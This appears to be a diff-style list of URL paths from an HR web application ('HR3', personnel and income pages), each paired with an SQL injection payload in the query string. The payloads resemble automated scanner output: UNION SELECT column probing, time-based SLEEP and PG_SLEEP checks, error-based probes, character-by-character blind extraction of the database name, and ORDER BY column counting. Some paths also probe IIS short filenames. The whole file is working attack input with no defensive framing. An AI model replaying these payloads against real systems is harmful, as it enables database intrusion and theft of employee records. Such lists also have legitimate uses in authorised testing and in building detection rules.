+/HR3/Common/ErrorPage/SystemSettingInfo.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ErrorPage/SystemSettingInfo.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ErrorPage/StdError.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/HRentry/login.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/HomePage/index.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Regulation/NTC/TNtcContentDetail.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/HREntry/HROnlyIndex.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/HREntry/top.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/Tree/ZTreeSecond.xsl	oper=m&recid=101536); SELECT PG_SLEEP(5)--
+/HR3/HREntry/defaultLeft.htm&ex2=&ex3=&ParaOther=	oper=m&recid=101536); SELECT PG_SLEEP(5)--
+/HR3/HomePage/index.aspx	oper=m&recid=101536'); SELECT PG_SLEEP(5)--
+/HR3/HREntry/HROnlyIndex.aspx	oper=m&recid=101536'); SELECT PG_SLEEP(5)--
+/HR3/HREntry/top.aspx	oper=m&recid=101536); SELECT SLEEP(5)-- 
+/HR3/HREntry/HROnlyTopMenu.aspx	oper=m&recid=101536); SELECT SLEEP(5)-- 
+/HR3/HREntry/HROnlyMenu.xml	oper=m&recid=101536'); SELECT SLEEP(5)-- 
+/HR3/Common/Tree/ZTreeSecond.xsl	oper=m&recid=101536'); SELECT SLEEP(5)-- 
+/HR3/HREntry/top.aspx	oper=m&recid=101536; SELECT PG_SLEEP(5)--
+/HR3/HREntry/HROnlyTopMenu.aspx	oper=m&recid=101536; SELECT PG_SLEEP(5)--
+/HR3/HREntry/HROnlyMenu.xml	oper=m&recid=101536'; SELECT PG_SLEEP(5)--
+/HR3/Common/Tree/ZTreeSecond.xsl	oper=m&recid=101536'; SELECT PG_SLEEP(5)--
+/HR3/HREntry/defaultLeft.htm&ex2=&ex3=&ParaOther=	oper=m&recid=101536; SELECT SLEEP(5)-- 
+/HR3/HREntry/defaultLeft.htm	oper=m&recid=101536'; SELECT SLEEP(5)-- 
+/HR3/HREntry/defaultLeft.htm&ex2=&ex3=&ParaOther=	oper=m&recid=101536'; SELECT SLEEP(5)-- 
+/*9*~1*/a.aspx	recid=(SELECT (CHR(58)||CHR(113)||CHR(109)||CHR(114)||CHR(58))||(SELECT (CASE WHEN (9811=9811) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(105)||CHR(99)||CHR(58)))
+/*~1.*9*/a.aspx	recid=(SELECT (CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (5263=5263) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)))
+/1234567890a*~1*/a.aspx	recid=(SELECT CHAR(58)+CHAR(113)+CHAR(109)+CHAR(114)+CHAR(58)+(SELECT (CASE WHEN (1499=1499) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(105)+CHAR(99)+CHAR(58))
+/*c*~1*/a.aspx	recid=(SELECT CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (3157=3157) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))
+/*~1.*b*/a.aspx	recid=(SELECT CHR(58)||CHR(113)||CHR(109)||CHR(114)||CHR(58)||(SELECT (CASE WHEN (3735=3735) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(105)||CHR(99)||CHR(58) FROM DUAL)
+/*b*~1*/a.aspx	recid=(SELECT CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (2460=2460) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58) FROM DUAL)
+/*~1.*a*/a.aspx	recid=(SELECT CONCAT(0x3a716d723a,(SELECT (CASE WHEN (2059=2059) THEN 1 ELSE 0 END)),0x3a6469633a))
+/1234567890c*~1*/a.aspx	recid=(SELECT CONCAT(0x3a7963643a,(SELECT (CASE WHEN (6123=6123) THEN 1 ELSE 0 END)),0x3a786d793a))
+/ast*~1*/a.aspx	recid=101533 AND (SELECT 6004 FROM(SELECT COUNT(*),CONCAT(0x3a716d723a,(SELECT (CASE WHEN (6004=6004) THEN 1 ELSE 0 END)),0x3a6469633a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/ws*~1*/a.aspx	recid=101533 AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/weba*~1*/a.aspx	recid=101533' AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YCdI'='YCdI
+/aspnb*~1*/a.aspx	recid=101533 AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL)
+/wer*~1*/a.aspx	recid=101533' AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND 'Rqkx'='Rqkx
+/aspr*~1*/a.aspx	recid=101533 AND 2288=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(109)||CHR(114)||CHR(58)||(SELECT (CASE WHEN (2288=2288) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(105)||CHR(99)||CHR(58)||CHR(62))) FROM DUAL)
+/asps*~1*/a.aspx	recid=101533 AND 3580=CONVERT(INT,(CHAR(58)+CHAR(113)+CHAR(109)+CHAR(114)+CHAR(58)+(SELECT (CASE WHEN (3580=3580) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(105)+CHAR(99)+CHAR(58)))
+/aspw*~1*/a.aspx	recid=101533 AND 6972=(SELECT 6972 FROM PG_SLEEP(5))
+/wew*~1*/a.aspx	recid=101533 AND 7652=CAST((CHR(58)||CHR(113)||CHR(109)||CHR(114)||CHR(58))||(SELECT (CASE WHEN (7652=7652) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(105)||CHR(99)||CHR(58)) AS NUMERIC)
+/webce*~1*/a.aspx	recid=101533 AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC)
+/webs*~1*/a.aspx	recid=101533' AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND 'Dnmi'='Dnmi
+/webt*~1*/a.aspx	recid=101533 AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58)))
+/aspne~1*/a.aspx	recid=101533' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND 'Tvgv'='Tvgv
+/webct*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 100
+/aspnec*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 102
+/aspnr*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 103
+/aspnee*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 104
+/webct?*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 112
+/aspns*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 64
+/aspnt*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1)) > 96
+/aspnen*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 112
+/webct~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 113
+/aspnw*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 114
+/aspnep*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 116
+/webcw*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 120
+/webcta*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 64
+/aspner*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),2,1)) > 96
+/webctb*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 1
+/aspnes*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 16
+/webctc*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 2
+/aspnet*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 32
+/webcte*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 4
+/aspnet~1?/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 64
+/webctn*~1*/a.aspx	recid=101533 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),3,1)) > 8
+/HR3/HRentry/login.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/HRentry/login.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/HomePage/index.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/HomePage*~1*/index.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/xHomePage*~1*/index.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/xHomePage*~1*/.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/naviga~1.HTML	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 UNION ALL SELECT NULL-- 
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533 UNION ALL SELECT NULL,NULL-- 
+/HR3/COMMON/Finder/PeopleFinder/Filterbrowse.aspx	recid=101533 UNION ALL SELECT NULL,NULL-- 
+/HR3/COMMON/Finder/PeopleFinder/Filterbrowse.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/COMMON/Finder/PeopleFinder/Filterbrowse.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/COMMON/Finder/PeopleFinder/Filterbrowse.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/COMMON/Finder/PeopleFinder/Filterbrowse.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/HRentry/login.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/HomePage/index.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/index.htm	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/topmenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/querymenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/inputmenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/querymenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/auditmenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhReportView.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhReportView.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/index.htm	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/topmenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/querymenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/querymenu.aspx	recid=101533 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/inputmenu.aspx	recid=101533%' AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/Common/ERRORPAGE/RightError.aspx	recid=101533%' AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/Personnel/Lzh/LzhDeclareNotice.aspx	recid=101533%' AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533%' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND '%'='
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533%'; SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhTradeEdit.aspx	recid=101533%'; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhTradeEdit.aspx	recid=101533) AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (4657=4657
+/HR3/Personnel/Lzh/LzhAffairEdit.aspx	recid=101533') AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('qoyj'='qoyj
+/HR3/Personnel/Lzh/LzhDisciplineEdit.aspx	recid=101533) AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND (9941=9941
+/HR3/Personnel/Lzh/LzhDisciplineEdit.aspx	recid=101533') AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND ('bonR'='bonR
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533) AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND (1067=1067
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	recid=101533') AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND ('Szit'='Szit
+/HR3/Personnel/Lzh/LzhTradeEdit.aspx	recid=101533) AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND (5089=5089
+/HR3/Personnel/Lzh/LzhDeclareList.aspx	recid=101533') AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND ('QtUf'='QtUf
+/HR3/Personnel/Lzh/LzhReportEdit.aspx	recid=101533); SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhReportEdit.aspx	recid=101533); SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhReportEdit.aspx	recid=101533; SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhDisciplineEdit.aspx	recid=101533'; SELECT PG_SLEEP(5)--
+/HR3/Personnel/Lzh/LzhDisciplineEdit.aspx	recid=101533; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhAffairEdit.aspx	recid=101533; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhDeclareNotice.aspx	SearchName=&SetSelect=true&Type=undefined
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	SearchName=&SetSelect=true&Type=undefined
+/webcr*~1*/a.aspx	recid=101533 AND QUARTER(NULL) IS NULL
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 1-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 1#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 6598-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 6648-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 7479#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 7497-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 9244#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate ORDER BY 9583#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 1-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) ORDER BY 1#
